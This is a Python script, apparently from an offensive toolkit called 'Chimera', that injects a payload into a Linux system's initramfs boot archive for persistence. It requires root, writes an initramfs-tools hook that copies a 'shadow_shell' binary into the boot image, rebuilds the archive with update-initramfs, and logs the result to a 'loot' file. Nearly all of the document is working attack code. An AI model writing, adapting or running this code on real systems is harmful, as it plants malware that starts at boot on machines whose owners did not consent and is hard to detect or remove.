import os
import sys
import subprocess
import shutil

def inject_initramfs(payload_path="/home/dan/Chimera_Project/agents/185_Shadow_Shell/shadow_shell"):
    """
    Weaponized Initramfs Injector: Modifies the boot archive to 
    execute a Chimera payload during the early boot stage.
    """
    if os.geteuid() != 0:
        print("[-] ROOT REQUIRED: Modifying boot archives requires UID 0.")
        sys.exit(1)

    print("[*] Identifying active initramfs archive...")
    # Get the current kernel version
    kernel_ver = subprocess.check_output(["uname", "-r"]).decode().strip()
    initrd_path = f"/boot/initrd.img-{kernel_ver}"
    
    if not os.path.exists(initrd_path):
        # Fallback for systems like CentOS/Fedora
        initrd_path = f"/boot/initramfs-{kernel_ver}.img"

    print(f"[*] Targeting: {initrd_path}")

    # Create a workspace
    tmp_dir = "/tmp/chimera_initrd"
    os.makedirs(tmp_dir, exist_ok=True)
    
    try:
        # 1. Copy payload to the scripts directory of initramfs
        # On many distros, scripts in /scripts/local-top/ run very early
        inject_script = f"{tmp_dir}/chimera_boot"
        with open(inject_script, "w") as f:
            f.write("#!/bin/sh\n")
            f.write("/bin/chimera_agent &\n")
        
        os.chmod(inject_script, 0o755)

        print("[*] Patching initramfs via 'update-initramfs' hooks...")
        # A more 'clean' way is to drop a script in /etc/initramfs-tools/hooks/
        hook_path = "/etc/initramfs-tools/hooks/chimera_hook"
        with open(hook_path, "w") as f:
            f.write(f"#!/bin/sh\ncopy_exec {payload_path} /bin/chimera_agent\n")
        
        os.chmod(hook_path, 0o755)

        # 2. Rebuild the initramfs
        print("[!] Rebuilding boot archive. This may take a moment...")
        subprocess.run(["update-initramfs", "-u"], check=True)

        print(f"[!!!] SUCCESS: Chimera is now embedded in the Boot Sequence.")
        
        # Log to project loot
        loot_path = "../../../loot/persistence_history.log"
        with open(loot_path, "a") as log:
            log.write(f"Type: INITRAMFS_INJECT | Kernel: {kernel_ver} | Status: PERSISTENT\n")

    except Exception as e:
        print(f"[-] Injection Fault: {e}")
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)

if __name__ == "__main__":
    inject_initramfs()
